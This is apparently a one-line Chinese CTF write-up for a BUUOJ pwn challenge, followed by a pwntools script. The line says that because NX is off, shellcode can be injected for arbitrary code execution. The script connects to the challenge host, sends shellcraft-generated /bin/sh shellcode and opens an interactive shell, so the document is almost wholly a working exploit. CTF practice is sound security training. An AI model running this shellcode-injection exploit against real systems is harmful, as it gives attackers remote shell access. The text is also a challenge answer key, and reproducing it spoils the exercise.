因为没开 NX ，所以可以直接注入 shellcode 执行任意代码

```python
from pwn import *

p = remote("node5.buuoj.cn",25019)

context(arch = 'amd64', os = 'linux')
shellcode = asm(shellcraft.sh())

p.sendline(shellcode)
p.interactive()
```
